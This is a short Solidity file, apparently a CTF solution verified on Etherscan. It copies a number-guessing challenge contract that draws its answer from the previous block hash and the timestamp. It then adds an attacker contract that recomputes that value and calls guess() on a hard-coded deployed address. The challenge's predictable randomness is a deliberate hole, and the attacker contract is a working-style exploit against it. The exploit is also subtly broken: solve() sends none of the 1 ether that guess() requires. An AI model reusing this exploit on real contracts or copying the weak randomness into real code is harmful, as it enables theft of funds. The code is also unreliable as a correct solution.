/**
 *Submitted for verification at Etherscan.io on 2022-03-22
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallengeInterface {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract InteractWithGuessInterface {

    address interfaceOb = 0xB85364f3FCc53A6Ea115832eEd1c823e5207AABd;
    GuessTheNewNumberChallengeInterface interactContract = GuessTheNewNumberChallengeInterface(interfaceOb);

    function solve() public payable returns (uint8) {

        uint8 solution = uint8(keccak256(block.blockhash(block.number - 1), now));
        interactContract.guess(solution);

        return solution;

    }


}